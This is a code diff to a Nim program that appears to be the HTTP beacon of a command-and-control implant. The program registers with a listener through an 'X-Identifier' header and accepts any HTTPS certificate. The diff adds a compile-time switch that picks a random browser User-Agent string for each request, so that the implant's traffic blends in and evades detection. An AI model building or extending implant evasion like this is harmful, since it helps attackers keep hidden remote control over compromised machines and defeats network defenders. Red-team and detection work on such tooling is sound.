@@ -4,6 +4,8 @@ from unicode import toLower
 from os import parseCmdLine
 import crypto
 import strenc
+import random 
+
 
 # Define the object with listener properties
 type
@@ -24,6 +26,27 @@ type
         userAgent* : string
         cryptKey* : string
 
+# we can define whether we want to use the randomized userAgents
+# initally its false, unless we specify otherwise in the complie command 
+const randomUserAgents {.booldefine.}: bool= false
+
+# define a function to pick random userAgents with each command
+proc getRandomUserAgent(): string =
+    let userAgents: seq[string] = @[
+      "Mozilla/5.0 (Windows NT 10.0; Win64; x64)",
+      "iPhone/15.0 (KHTML, like Gecko) Version/15.0 Mobile/15E148 Safari/604.1",
+      "Android/11 (Linux; Android 11) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Mobile Safari/537.36",
+      "AppleWebKit/605.1.15 (KHTML, like Gecko) Safari/605.1.15",
+      "Linux/x86_64 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36",
+      "SamsungBrowser/15.0 (Linux; Android 10) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/15.0 Mobile Safari/537.36",
+    ]
+
+    # we need to call this, in order to get a random number each time
+    randomize()  
+    let randomIndex = rand(userAgents.high)
+
+    return userAgents[randomIndex]
+
 # HTTP request function
 proc doRequest(li : Listener, path : string, postKey : string = "", postValue : string = "") : Response =
     try:
@@ -41,14 +64,26 @@ proc doRequest(li : Listener, path : string, postKey : string = "", postValue : 
 
             # Only send ID header once listener is registered
             if li.id != "":
-                headers = @[
+                if randomUserAgents:
+                    headers = @[
+                            Header(key: "X-Identifier", value: li.id),
+                            Header(key: "User-Agent", value: getRandomUserAgent())
+                        ]
+                else:
+                    headers = @[
                         Header(key: "X-Identifier", value: li.id),
                         Header(key: "User-Agent", value: li.userAgent)
-                    ]
+                    ] 
+
             else:
-                headers = @[
-                        Header(key: "User-Agent", value: li.userAgent)
-                    ]
+                if randomUserAgents:
+                    headers = @[
+                            Header(key: "User-Agent", value: getRandomUserAgent())
+                        ]
+                else:
+                    headers = @[
+                            Header(key: "User-Agent", value: li.userAgent)
+                        ]
 
             let req = Request(
                 url: parseUrl(target),
@@ -61,18 +96,35 @@ proc doRequest(li : Listener, path : string, postKey : string = "", postValue : 
 
         # POST request
         else:
-            let req = Request(
+            if randomUserAgents:
+                let req = Request(
                 url: parseUrl(target),
                 verb: "post",
                 headers: @[
                     Header(key: "X-Identifier", value: li.id),
-                    Header(key: "User-Agent", value: li.userAgent),
+                    Header(key: "User-Agent", value: getRandomUserAgent()),
                     Header(key: "Content-Type", value: "application/json")
                     ],
                 allowAnyHttpsCertificate: true,
                 body: "{\"" & postKey & "\":\"" & postValue & "\"}"
                 )
-            return fetch(req)
+                return fetch(req)
+
+
+
+            else:
+                let req = Request(
+                    url: parseUrl(target),
+                    verb: "post",
+                    headers: @[
+                        Header(key: "X-Identifier", value: li.id),
+                        Header(key: "User-Agent", value: li.userAgent),
+                        Header(key: "Content-Type", value: "application/json")
+                        ],
+                    allowAnyHttpsCertificate: true,
+                    body: "{\"" & postKey & "\":\"" & postValue & "\"}"
+                    )
+                return fetch(req)
 
     except:
         # Return a fictive error response to handle
